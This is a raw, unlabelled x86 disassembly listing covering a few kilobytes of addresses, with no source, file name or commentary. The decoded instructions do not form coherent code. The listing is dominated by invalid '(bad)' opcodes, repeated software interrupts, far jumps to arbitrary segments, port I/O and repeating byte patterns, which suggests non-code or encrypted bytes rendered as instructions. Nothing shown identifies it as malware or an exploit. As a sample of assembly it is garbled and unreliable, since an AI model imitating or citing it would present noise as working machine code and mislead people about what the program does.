  4252ff:	(bad)  
  425300:	std    
  425301:	int    0xa6
  425303:	std    
  425304:	cmp    edi,DWORD PTR [ebp+0x3b]
  425307:	loope  0x4252dc
  425309:	jmp    0x42529d
  42530b:	shl    ebp,cl
  42530d:	sub    BYTE PTR [ebx+0xc],dl
  425310:	aad    0xf3
  425312:	or     dl,BYTE PTR [esi-0x2723207]
  425318:	int    0x96
  42531a:	std    
  42531b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42531e:	(bad)  
  425320:	jmp    0x4252b4
  425322:	shr    edx,cl
  425324:	sub    BYTE PTR [ebx+0x13],dl
  425327:	xchg   DWORD PTR [edx],eax
  425329:	int    0x8d
  42532b:	cmc    
  42532c:	int    0x96
  42532e:	cmc    
  42532f:	cmp    ebx,ecx
  425331:	cmp    edi,DWORD PTR [ebp-0x2d]
  425334:	jmp    0x1353:0x92ebd328
  42533b:	int    0x96
  42533d:	std    
  42533e:	int    0xa6
  425340:	std    
  425341:	cmp    esi,ecx
  425343:	cmp    esp,ecx
  425345:	shl    ebp,cl
  425347:	sub    bl,dl
  425349:	repz xchg edx,eax
  42534b:	push   ebx
  42534c:	aad    0x33
  42534e:	adc    eax,DWORD PTR [ebx+0x2]
  425351:	das    
  425352:	pop    es
  425353:	pop    edx
  425354:	add    BYTE PTR [eax],al
  425356:	add    ch,cl
  425358:	jbe    0x425353
  42535a:	int    0x8d
  42535c:	mov    BYTE PTR [edx-0x327ef558],ch
  425362:	jbe    0x42535d
  425364:	arpl   bx,cx
  425366:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42536d:	ins    DWORD PTR es:[edi],dx
  42536e:	pop    esi
  42536f:	jbe    0x4253bd
  425371:	aam    0x3a
  425373:	pop    esi
  425374:	jbe    0x4252fe
  425376:	fdiv   DWORD PTR [edx]
  425378:	retf   0x8814
  42537b:	or     DWORD PTR [esi-0x69a6d0d1],edx
  425381:	das    
  425382:	adc    dh,bl
  425384:	in     eax,dx
  425385:	add    BYTE PTR [eax+0x2f960980],0xf1
  42538c:	lea    ebp,[edi]
  42538e:	retf   0x2f96
  425391:	or     DWORD PTR [eax+ecx*4],edx
  425394:	ins    BYTE PTR es:[edi],dx
  425395:	inc    ebx
  425396:	jbe    0x425320
  425398:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  42539f:	stc    
  4253a0:	std    
  4253a1:	add    BYTE PTR [eax],al
  4253a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253a4:	ror    BYTE PTR [eax-0x12326980],cl
  4253aa:	adc    ch,ch
  4253ac:	cmp    al,0x84
  4253ae:	add    BYTE PTR [eax+0x49bf985b],0x21
  4253b5:	xchg   BYTE PTR ds:0xc911a60a,dh
  4253bb:	jbe    0x4253ba
  4253bd:	inc    ecx
  4253be:	and    DWORD PTR [esi-0x128936cb],eax
  4253c4:	dec    ecx
  4253c5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253cb:	jno    0x425383
  4253cd:	cli    
  4253ce:	arpl   bp,cx
  4253d0:	jbe    0x4253e3
  4253d2:	int    0x8d
  4253d4:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  4253da:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  4253e4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4253e8:	or     dh,BYTE PTR [esi-0x7]
  4253eb:	leave  
  4253ec:	jbe    0x425393
  4253ee:	into   
  4253ef:	and    DWORD PTR [esi-0x628936cb],eax
  4253f5:	inc    esi
  4253f6:	sbb    DWORD PTR [ebp-0x528936de],esi
  4253fc:	mov    BYTE PTR [eax-0x34327f80],al
  425402:	int    0x76
  425404:	std    
  425405:	int    0x8d
  425407:	std    
  425408:	cmp    esi,eax
  42540a:	shl    edx,cl
  42540c:	sub    BYTE PTR [ebx],bh
  42540e:	jns    0x4253e3
  425410:	mov    ebp,0xcdd35392
  425415:	lea    edx,[ecx]
  425417:	int    0x96
  425419:	adc    DWORD PTR [ebx],edi
  42541b:	(bad)  
  42541d:	(bad)  
  42541f:	jmp    0x4253b3
  425421:	shr    edx,cl
  425423:	sub    BYTE PTR [ebx+0x13],dl
  425426:	das    
  425427:	rcl    ebx,1
  425429:	in     al,dx
  42542a:	outs   dx,BYTE PTR ds:[esi]
  42542b:	int    0x76
  42542d:	cmc    
  42542e:	int    0x8d
  425430:	cmc    
  425431:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425437:	push   ebx
  425438:	sar    DWORD PTR [ebx],cl
  42543a:	lds    ecx,FWORD PTR [edx]
  42543c:	jbe    0x425437
  42543e:	iret   
  42543f:	jbe    0x42543a
  425441:	jo     0x425400
  425443:	mov    ecx,0xa0000fe
  425448:	jbe    0x425443
  42544a:	int    0x76
  42544c:	stc    
  42544d:	int    0x8d
  42544f:	cmc    
  425450:	or     al,BYTE PTR ds:0xfc9dcf
  425456:	add    ch,cl
  425458:	jbe    0x425457
  42545a:	int    0x8d
  42545c:	std    
  42545d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425460:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425467:	push   ebx
  425468:	rol    DWORD PTR [edi+0x760af576],cl
  42546e:	cmc    
  42546f:	int    0x76
  425471:	in     eax,dx
  425472:	int    0x8d
  425474:	in     eax,dx
  425475:	cmp    esi,eax
  425477:	shl    edx,cl
  425479:	sub    BYTE PTR [ebx],bh
  42547b:	jns    0x425450
  42547d:	mov    ebp,0xcdd35392
  425482:	(bad)  
  425483:	std    
  425484:	int    0x96
  425486:	std    
  425487:	cmp    ecx,DWORD PTR [edi]
  425489:	cmp    ebx,ecx
  42548b:	shr    ebx,cl
  42548d:	xchg   edx,eax
  42548e:	shr    edx,cl
  425490:	sub    BYTE PTR [ebx+0x13],dl
  425493:	xor    edx,ebx
  425495:	int    0x8d
  425497:	cmc    
  425498:	inc    ebx
  425499:	jge    0x425473
  42549b:	mov    bl,0xcd
  42549d:	jbe    0x425454
  42549f:	int    0x8d
  4254a1:	mov    ch,0x3b
  4254a3:	jns    0x4254e0
  4254a5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254ac:	push   ebx
  4254ad:	ror    DWORD PTR [edx],cl
  4254af:	jbe    0x4254aa
  4254b1:	leave  
  4254b2:	jbe    0x4254a1
  4254b4:	bound  ebx,QWORD PTR [edi]
  4254b6:	xchg   BYTE PTR ds:0x1ebddcd,dh
  4254bc:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254c3:	jbe    0x42546a
  4254c5:	cmp    ecx,ecx
  4254c7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254cd:	jmp    0x425461
  4254cf:	push   ebx
  4254d0:	jge    0x42549f
  4254d2:	jbe    0x4254cd
  4254d4:	aad    0xbd
  4254d6:	or     dh,BYTE PTR [esi-0x63]
  4254d9:	int    0x76
  4254db:	mov    dl,cl
  4254dd:	or     BYTE PTR [ecx],0x76
  4254e0:	in     al,dx
  4254e1:	retf   0xec76
  4254e4:	int    0x8d
  4254e6:	stc    
  4254e7:	das    
  4254e8:	pop    ecx
  4254e9:	ins    DWORD PTR es:[edi],dx
  4254ea:	cmp    edx,ebx
  4254ec:	or     dh,BYTE PTR [esi-0xb]
  4254ef:	int    0x76
  4254f1:	in     eax,dx
  4254f2:	int    0x8d
  4254f4:	in     eax,dx
  4254f5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4254f8:	mov    ebp,0xd3f03b92
  4254fd:	repnz sub BYTE PTR [ebx-0x2d],dl
  425501:	int    0x8d
  425503:	cmc    
  425504:	sub    edx,ebx
  425506:	int    0x5
  425508:	push   es
  425509:	popf   
  42550a:	cld    
  42550b:	add    BYTE PTR [eax],al
  42550d:	int    0x8d
  42550f:	popf   
  425510:	cmp    edx,ebx
  425512:	or     dh,BYTE PTR [esi-0x7]
  425515:	int    0x76
  425517:	std    
  425518:	int    0x8d
  42551a:	std    
  42551b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42551e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425525:	push   ebx
  425526:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42552c:	std    
  42552d:	int    0x8d
  42552f:	std    
  425530:	cmp    edi,DWORD PTR [ecx+0x3b]
  425533:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42553a:	push   ebx
  42553b:	sar    DWORD PTR [esi],cl
  42553d:	jbe    0x4254ec
  42553f:	int    0x76
  425541:	adc    ebp,ecx
  425543:	lea    edx,[ecx]
  425545:	cmp    esi,eax
  425547:	cmp    edi,DWORD PTR [ecx-0x2d]
  42554a:	repnz sub bl,dl
  42554d:	mov    ebp,0xcdd35392
  425552:	lea    ebp,[ebp+0x62f7d43]
  425558:	imul   eax,DWORD PTR [eax],0x0
  42555b:	add    ch,cl
  42555d:	jbe    0x425514
  42555f:	int    0x8d
  425561:	mov    ch,0x3b
  425563:	jns    0x4255a0
  425565:	lock shl edx,cl
  425568:	sub    bl,dl
  42556a:	mov    ebp,0xd353aa92
  42556f:	int    0x8d
  425571:	stc    
  425572:	test   al,0x3b
  425574:	shl    DWORD PTR [ebx-0x35],cl
  425577:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  42557e:	in     eax,dx
  42557f:	xor    BYTE PTR [ebx],bh
  425581:	retf   
  425582:	pop    ebx
  425583:	call   0xbb05:0x2f888d5e
  42558a:	add    BYTE PTR [eax+0x2f024380],0x5
  425591:	rol    DWORD PTR [eax-0x44d07f80],1
  425597:	cwde   
  425598:	sub    al,0x5d
  42559a:	lahf   
  42559b:	xor    eax,0x8d0a8080
  4255a0:	std    
  4255a1:	or     cl,BYTE PTR [ebp+0xaf13b11]
  4255a7:	(bad)  
  4255a8:	stc    
  4255a9:	mov    eax,0xe3b813cd
  4255ae:	retf   
  4255af:	cmp    eax,DWORD PTR [eax]
  4255b1:	leave  
  4255b2:	jbe    0x4255a9
  4255b4:	adc    al,0x80
  4255b6:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  4255bd:	mov    eax,0xb8fde6cd
  4255c2:	jecxz  0x42558d
  4255c4:	mov    eax,0xbb2ff93b
  4255c9:	(bad)  
  4255ca:	stc    
  4255cb:	iret   
  4255cc:	dec    esp
  4255cd:	into   
  4255ce:	mov    eax,0xd692de5e
  4255d3:	pop    edx
  4255d4:	das    
  4255d5:	mov    ebx,0xf58d0a89
  4255da:	mov    eax,0x4dd67d43
  4255df:	das    
  4255e0:	mov    ebx,0xa6cdfd8d
  4255e5:	mov    BYTE PTR [ecx],al
  4255e7:	fs push ds
  4255e9:	adc    ah,0x3b
  4255ec:	das    
  4255ed:	mov    ebx,0xa6cdfd8d
  4255f2:	mov    BYTE PTR [eax+0x1e4c692f],bh
  4255f8:	mov    eax,0x3bb8d3e3
  4255fd:	jge    0x4255b7
  4255ff:	pop    esi
  425600:	(bad)  
  425601:	cmc    
  425602:	aam    0x23
  425604:	leave  
  425605:	jbe    0x4255fc
  425607:	sbb    BYTE PTR [eax+0x76008080],al
  42560d:	stc    
  42560e:	int    0x7d
  425610:	mov    eax,0xb82c8e3b
  425615:	jecxz  0x4255e2
  425617:	mov    eax,0x82f98d5e
  42561c:	inc    ecx
  42561d:	in     al,dx
  42561e:	dec    edx
  42561f:	add    BYTE PTR [esi+0x11],dh
  425622:	leave  
  425623:	jbe    0x42561a
  425625:	push   ss
  425626:	add    BYTE PTR [eax-0x1944d080],0xfd
  42562d:	int    0xa6
  42562f:	mov    BYTE PTR [ebx],bh
  425631:	retf   
  425632:	pop    esp
  425633:	dec    esp
  425634:	sub    dl,ah
  425636:	push   ss
  425637:	add    BYTE PTR [esi-0x3],dh
  42563a:	add    al,0xe6
  42563c:	cmc    
  42563d:	sbb    BYTE PTR [edi],ch
  42563f:	push   es
  425640:	jb     0x425642
  425642:	add    BYTE PTR [eax],al
  425644:	cmp    ebp,DWORD PTR [ebp-0x56]
  425647:	arpl   bx,cx
  425649:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425650:	jecxz  0x425625
  425652:	mov    eax,0x6d3b7d3b
  425657:	mov    eax,0x2f2c8e43
  42565c:	adc    eax,0x96b9ec6d
  425661:	int    0xed
  425663:	add    al,0xed
  425665:	mov    esp,0xc09a985b
  42566a:	inc    esp
  42566b:	add    dh,dl
  42566d:	mov    ch,cl
  42566f:	adc    DWORD PTR [ebp+0xf90b],edi
  425675:	iret   
  425676:	js     0x4256aa
  425678:	or     dh,BYTE PTR [esi+0x25]
  42567b:	iret   
  42567c:	js     0x4256f2
  42567e:	or     dh,BYTE PTR [esi+0x2d]
  425681:	iret   
  425682:	js     0x42563c
  425684:	or     dh,BYTE PTR [esi+0x35]
  425687:	iret   
  425688:	pop    es
  425689:	or     DWORD PTR [eax+0x760a8080],eax
  42568f:	cmp    eax,0x804107cf
  425694:	add    BYTE PTR [eax-0x30ba89f6],0x7
  42569b:	or     eax,0xa808080
  4256a0:	jbe    0x425672
  4256a2:	iret   
  4256a3:	pop    es
  4256a4:	out    dx,eax
  4256a5:	add    BYTE PTR [eax+0x55760a80],0xcf
  4256ac:	pop    es
  4256ad:	xor    BYTE PTR [ecx+0x760a8080],al
  4256b3:	pop    ebp
  4256b4:	iret   
  4256b5:	pop    es
  4256b6:	inc    edx
  4256b7:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256c1:	pop    es
  4256c2:	xchg   esp,eax
  4256c3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256cd:	add    BYTE PTR [eax-0x25c4af33],0xa
  4256d4:	xchg   esi,eax
  4256d5:	icebp  
  4256d6:	or     dl,BYTE PTR [esi-0x6269f56b]
  4256dc:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  4256e2:	(bad)  
  4256e3:	mov    cl,0xde
  4256e5:	adc    ebx,DWORD PTR [ebp-0x43]
  4256e8:	or     ah,BYTE PTR [ebx]
  4256ea:	and    eax,0xcd0d760a
  4256ef:	lea    edi,[ebp-0x33]
  4256f2:	out    0xd,al
  4256f4:	cmp    edi,ecx
  4256f6:	adc    al,BYTE PTR [edx]
  4256f8:	jnp    0x425731
  4256fa:	ficom  WORD PTR [ebx]
  4256fc:	das    
  4256fd:	inc    ebp
  4256fe:	cli    
  4256ff:	xchg   edx,eax
  425700:	rcl    DWORD PTR [eax],cl
  425702:	xchg   edx,eax
  425703:	or     ah,dh
  425705:	mov    ch,0xcd
  425707:	out    0x7d,al
  425709:	int    0xa6
  42570b:	or     eax,0x3be1cd
  425710:	cmp    eax,DWORD PTR [ebx]
  425712:	shl    ebp,cl
  425714:	sub    BYTE PTR [ebx-0x10],dl
  425717:	int    0xe6
  425719:	mov    ch,0x61
  42571b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425722:	cld    
  425723:	push   ebx
  425724:	lock or dl,dh
  425727:	stc    
  425728:	das    
  425729:	add    eax,0x808080f2
  42572e:	adc    dh,BYTE PTR [esi-0xf]
  425731:	(bad)  
  425732:	mov    esp,0xeb5f8bbd
  425737:	or     ah,BYTE PTR [ebx]
  425739:	and    eax,0x12958d31
  42573e:	jbe    0x4256dd
  425740:	(bad)  
  425741:	mov    esp,0x8d318790
  425746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425747:	int    0x8d
  425749:	jge    0x425718
  42574b:	(bad)  
  42574c:	or     eax,0xcd7de6cd
  425751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425752:	or     eax,0x212113b
  425757:	jnp    0x425790
  425759:	ficom  WORD PTR [ebx]
  42575b:	das    
  42575c:	inc    ebp
  42575d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425763:	out    dx,eax
  425764:	xchg   edx,eax
  425765:	cmp    ebx,ebp
  425767:	cmp    eax,DWORD PTR [ebx]
  425769:	push   ebx
  42576a:	or     al,0x53
  42576c:	clc    
  42576d:	add    al,0xd3
  42576f:	add    BYTE PTR [ecx+ebx*4],al
  425772:	add    BYTE PTR [edx],cl
  425774:	lea    edi,[ebp+0xa]
  425777:	(bad)  
  425778:	or     eax,0x53f18dcd
  42577d:	lea    edx,[ebp+0x761223d4]
  425783:	icebp  
  425784:	mov    edx,DWORD PTR [ebx]
  425786:	dec    edx
  425787:	stc    
  425788:	pop    edi
  425789:	sbb    al,bl
  42578b:	mov    ch,0x6b
  42578d:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  425793:	(bad)
  425796:	std    
  425797:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  42579d:	(bad)  
  42579e:	icebp  
  42579f:	(bad)  
  4257a0:	mov    esp,0x76897abd
  4257a5:	xchg   ebp,eax
  4257a6:	adc    dh,BYTE PTR [esi-0x6f433963]
  4257ac:	add    al,0x12
  4257ae:	mov    dh,0xa5
  4257b0:	jmp    0x4257bc
  4257b2:	and    esp,DWORD PTR ds:0xcd7d8dcd
  4257b8:	lea    ecx,ds:0xcd7de6cd
  4257be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257bf:	or     eax,0x92fc352f
  4257c4:	shr    ebx,cl
  4257c6:	sub    BYTE PTR [ebx],bh
  4257c8:	not    DWORD PTR [ebx-0xc]
  4257cb:	shr    ecx,cl
  4257cd:	xchg   edx,eax
  4257ce:	push   ebx
  4257cf:	lock adc al,BYTE PTR [edx]
  4257d2:	(bad)  
  4257d3:	aaa    
  4257d4:	ficom  WORD PTR [ebx]
  4257d6:	or     cl,BYTE PTR [ebp+0xa113b7d]
  4257dc:	(bad)  
  4257dd:	or     eax,0xcd7d8dcd
  4257e2:	(bad)  
  4257e3:	or     eax,0xcd7de6cd
  4257e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257e9:	or     eax,0x212113b
  4257ee:	jnp    0x425827
  4257f0:	ficom  WORD PTR [ebx]
  4257f2:	das    
  4257f3:	inc    ebp
  4257f4:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257fa:	out    dx,eax
  4257fb:	xchg   edx,eax
  4257fc:	cmp    ebx,ebp
  4257fe:	cmp    eax,DWORD PTR [ebx]
  425800:	push   ebx
  425801:	or     al,0x53
  425803:	clc    
  425804:	push   ebx
  425805:	comiss xmm0,DWORD PTR [esi]
  425808:	xor    al,BYTE PTR [eax]
  42580a:	add    BYTE PTR [eax],al
  42580c:	int    0xd6
  42580e:	stc    
  42580f:	push   es
  425810:	imul   DWORD PTR [edi]
  425812:	add    eax,0x808080d1
  425817:	int    0x78
  425819:	fs int 0xe4
  42581c:	push   eax
  42581d:	fadd   QWORD PTR [edi+0x349acdff]
  425823:	int    0x6f
  425825:	and    al,0xcd
  425827:	jp     0x425855
  425829:	int    0xaa
  42582b:	sbb    al,0x87
  42582d:	cdq    
  42582e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425834:	xchg   DWORD PTR [edi],ecx
  425836:	xchg   DWORD PTR [ecx+0xa],edi
  425839:	(bad)  
  42583a:	in     eax,dx
  42583b:	or     dh,BYTE PTR [esi-0x6b]
  42583e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425844:	xchg   DWORD PTR [edx],ecx
  425846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425847:	cmc    
  425848:	cmp    ebx,edx
  42584a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425850:	fcom   st(4)
  425852:	in     al,dx
  425853:	xchg   ebp,ecx
  425855:	jbe    0x4257ec
  425857:	int    0xa6
  425859:	or     eax,0x5b24bb2f
  42585e:	inc    ebx
  42585f:	call   0x14aa:0x436b771c
  425866:	ja     0x425810
  425868:	int    0x84
  42586a:	mov    al,0xcd
  42586c:	xchg   esi,eax
  42586d:	mov    ch,cl
  42586f:	and    al,0x1f
  425871:	or     dl,BYTE PTR [esi-0x30867803]
  425877:	xchg   esi,eax
  425878:	sbb    eax,0x9633a987
  42587d:	mov    BYTE PTR [edx],cl
  42587f:	jbe    0x425892
  425881:	or     dl,BYTE PTR [esi-0x4a89368b]
  425887:	push   ebx
  425888:	add    BYTE PTR [eax-0x2693280],0x4
  42588f:	pusha  
  425890:	adc    dh,0x28
  425893:	jo     0x425862
  425895:	jbe    0x42590c
  425897:	int    0x54
  425899:	xor    BYTE PTR [ebp+0xfddd],bh
  42589f:	int    0xd6
  4258a1:	stc    
  4258a2:	int    0x8d
  4258a4:	in     eax,dx
  4258a5:	push   es
  4258a6:	ins    DWORD PTR es:[edi],dx
  4258a7:	aam    0x85
  4258a9:	int    0x76
  4258ab:	std    
  4258ac:	or     bl,BYTE PTR [ecx*8+0x76041176]
  4258b3:	std    
  4258b4:	test   BYTE PTR [eax],al
  4258b6:	lea    esi,[ebp-0x69321c2a]
  4258bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258bd:	push   edx
  4258be:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258c4:	or     dh,0xaa
  4258c7:	int    0x79
  4258c9:	test   al,0x63
  4258cb:	retf   
  4258cc:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  4258d3:	int    0xd6
  4258d5:	mov    BYTE PTR [eax],al
  4258d7:	pop    ecx
  4258d8:	adc    DWORD PTR [ecx+0x76cd8080],eax
  4258de:	mov    BYTE PTR [ebp+0xfee4],bh
  4258e4:	int    0x7
  4258e6:	cmp    eax,0x3b808081
  4258eb:	retf   
  4258ec:	pop    esi
  4258ed:	mov    BYTE PTR [eax-0x322ce8d1],ch
  4258f3:	shl    DWORD PTR [esi-0x327f7b2e],cl
  4258f9:	fwait
  4258fa:	sbb    eax,0x5b808081
  4258ff:	cwde   
  425900:	int    0x11
  425902:	pop    ebp
  425903:	lahf   
  425904:	xor    eax,0x4eec8080
  425909:	cmp    edi,DWORD PTR [ebp-0x48]
  42590c:	jecxz  0x4258d9
  42590e:	mov    eax,0xd2044a0a
  425913:	xchg   edx,eax
  425914:	add    al,0x79
  425916:	xchg   edx,eax
  425917:	das    
  425918:	mov    ebx,0x7d43b84e
  42591d:	(bad)  
  42591e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425922:	mov    eax,0x8cd920a
  425927:	sbb    eax,0x63808081
  42592c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425932:	sbb    eax,0xd3808081
  425937:	jmp    0xed0be0c2
  42593c:	dec    edx
  42593d:	add    DWORD PTR [edx],eax
  42593f:	add    DWORD PTR [ecx],0xffffffeb
  425942:	mov    esi,0x526c8809
  425947:	retf   0x14a
  42594a:	cli    
  42594b:	sbb    dh,dl
  42594d:	adc    BYTE PTR [ecx-0x80],bh
  425950:	or     ch,0x7
  425953:	sbb    eax,0x87808081
  425958:	leave  
  425959:	stos   BYTE PTR es:[edi],al
  42595a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425960:	mov    al,0x80
  425962:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425969:	and    eax,0x76c99a98
  42596e:	cmc    
  42596f:	xchg   ecx,eax
  425970:	aaa    
  425971:	ficom  WORD PTR [ebx]
  425973:	or     cl,BYTE PTR [ebp-0x12893607]
  425979:	(bad)  
  42597a:	aaa    
  42597b:	ficom  WORD PTR [ebx]
  42597d:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  425983:	jbe    0x425942
  425985:	dec    ecx
  425986:	and    DWORD PTR [esi-0x28936cb],eax
  42598c:	inc    ecx
  42598d:	and    DWORD PTR [esi-0xe8936cb],eax
  425993:	out    0x37,al
  425995:	ficom  WORD PTR [ebx]
  425997:	or     cl,BYTE PTR [ebp+0x5d76c995]
  42599d:	fidiv  WORD PTR [edi]
  42599f:	ficom  WORD PTR [ebx]
  4259a1:	or     cl,BYTE PTR [ebp-0x1289329b]
  4259a7:	int    0x96
  4259a9:	adc    DWORD PTR [edi],ebp
  4259ab:	inc    ebp
  4259ac:	icebp  
  4259ad:	xchg   edx,eax
  4259ae:	shl    ebx,cl
  4259b0:	xchg   edx,eax
  4259b1:	int    0x96
  4259b3:	in     eax,dx
  4259b4:	int    0xd6
  4259b6:	adc    ebx,edx
  4259b8:	jmp    0x4229:0xbea6c328
  4259bf:	cmp    ecx,ecx
  4259c1:	cmp    esi,edi
  4259c3:	push   ebx
  4259c4:	jns    0x4259d0
  4259c6:	jbe    0x42596d
  4259c8:	iret   
  4259c9:	jbe    0x425978
  4259cb:	or     dh,BYTE PTR [esi+0xd]
  4259ce:	int    0x76
  4259d0:	or     eax,0x8621d169
  4259d5:	xor    eax,0x37b680c9
  4259da:	ficom  WORD PTR [ebx]
  4259dc:	or     bh,BYTE PTR [esp+eax*4-0x33]
  4259e0:	(bad)  
  4259e1:	std    
  4259e2:	int    0x96
  4259e4:	std    
  4259e5:	cmp    ecx,DWORD PTR [edi]
  4259e7:	shr    ebx,cl
  4259e9:	xchg   edx,eax
  4259ea:	sar    bh,0x9c
  4259ed:	cmp    esi,ecx
  4259ef:	shr    edx,cl
  4259f1:	sub    BYTE PTR [ebx+0x13],dl
  4259f4:	int    0x96
  4259f6:	std    
  4259f7:	int    0xa6
  4259f9:	std    
  4259fa:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a00:	popf   
  425a01:	shl    ebp,cl
  425a03:	sub    BYTE PTR [ebx-0x2b],dl
  425a06:	xchg   DWORD PTR [ebx],edx
  425a08:	int    0x96
  425a0a:	std    
  425a0b:	int    0xa6
  425a0d:	std    
  425a0e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a14:	popf   
  425a15:	shl    ebp,cl
  425a17:	sub    BYTE PTR [ebx-0x2b],dl
  425a1a:	xchg   DWORD PTR [ebx],edx
  425a1c:	int    0x96
  425a1e:	std    
  425a1f:	int    0xa6
  425a21:	std    
  425a22:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a28:	popf   
  425a29:	shl    ebp,cl
  425a2b:	sub    BYTE PTR [ebx-0x2b],dl
  425a2e:	xchg   DWORD PTR [ebx],edx
  425a30:	or     cl,bh
  425a32:	nop
  425a33:	add    BYTE PTR [eax],al
  425a35:	add    ch,cl
  425a37:	lea    edi,[ebp+0x3bbd96cd]
  425a3d:	icebp  
  425a3e:	cmp    ecx,DWORD PTR [edi]
  425a40:	shr    edx,cl
  425a42:	sub    bl,dl
  425a44:	jmp    0x4259d8
  425a46:	push   ebx
  425a47:	adc    ecx,ebp
  425a49:	xchg   esi,eax
  425a4a:	mov    ebp,0x3bbda6cd
  425a4f:	cdq    
  425a50:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a56:	in     eax,0x28
  425a58:	push   ebx
  425a59:	aad    0xa
  425a5b:	int3   
  425a5c:	pop    ss
  425a5d:	aam    0x0
  425a5f:	add    BYTE PTR [eax],al
  425a61:	int    0x8d
  425a63:	dec    esp
  425a64:	int    0x89
  425a66:	int    0x96
  425a68:	std    
  425a69:	int    0xa6
  425a6b:	std    
  425a6c:	int    0x7e
  425a6e:	jo     0x425aab
  425a70:	popf   
  425a71:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425a77:	in     eax,0x28
  425a79:	push   ebx
  425a7a:	aad    0xa
  425a7c:	int3   
  425a7d:	pop    ss
  425a7e:	aam    0x0
  425a80:	add    BYTE PTR [eax],al
  425a82:	int    0x8d
  425a84:	xor    ch,cl
  425a86:	xchg   esi,eax
  425a87:	xor    BYTE PTR [ebx],bh
  425a89:	icebp  
  425a8a:	cmp    ecx,DWORD PTR [edi]
  425a8c:	shr    edx,cl
  425a8e:	sub    bl,dl
  425a90:	jmp    0x425a24
  425a92:	push   ebx
  425a93:	adc    ecx,ebp
  425a95:	xchg   esi,eax
  425a96:	std    
  425a97:	int    0xa6
  425a99:	std    
  425a9a:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425aa0:	cdq    
  425aa1:	shl    ebx,cl
  425aa3:	xchg   edx,eax
  425aa4:	shl    ebp,cl
  425aa6:	sub    BYTE PTR [ebx-0x2b],dl
  425aa9:	int    0xa6
  425aab:	std    
  425aac:	cmp    edi,DWORD PTR [ecx-0x2d]
  425aaf:	mov    ebp,0xfff40492
  425ab4:	shl    ebp,cl
  425ab6:	sub    BYTE PTR [ebx-0x3b],dl
  425ab9:	xchg   ecx,esi
  425abb:	int    0x76
  425abd:	adc    al,0xa
  425abf:	int3   
  425ac0:	pop    ss
  425ac1:	aam    0x0
  425ac3:	add    BYTE PTR [eax],al
  425ac5:	int    0x8d
  425ac7:	adc    al,0x4
  425ac9:	add    bh,bh
  425acb:	shl    edx,cl
  425acd:	sub    BYTE PTR [ebx],bh
  425acf:	jns    0x425aa4
  425ad1:	mov    ebp,0xcdd35392
  425ad6:	(bad)  
  425ad7:	std    
  425ad8:	int    0x96
  425ada:	std    
  425adb:	add    al,0xfb
  425add:	(bad)  
  425ade:	cmp    ecx,DWORD PTR [edi]
  425ae0:	shr    edx,cl
  425ae2:	sub    bl,dl
  425ae4:	jmp    0x425a78
  425ae6:	push   ebx
  425ae7:	adc    ecx,ebp
  425ae9:	xchg   esi,eax
  425aea:	std    
  425aeb:	int    0xa6
  425aed:	std    
  425aee:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425af4:	repz xchg edx,eax
  425af6:	shl    ebp,cl
  425af8:	sub    BYTE PTR [ebx-0x2b],dl
  425afb:	xchg   DWORD PTR [ebx],edx
  425afd:	int    0x96
  425aff:	std    
  425b00:	int    0xa6
  425b02:	std    
  425b03:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b09:	in     eax,0x28
  425b0b:	shl    ebx,cl
  425b0d:	xchg   edx,eax
  425b0e:	push   ebx
  425b0f:	aad    0x87
  425b11:	adc    ecx,DWORD PTR [edx]
  425b13:	add    eax,0xd4cf
  425b18:	add    bh,cl
  425b1a:	push   es
  425b1b:	nop
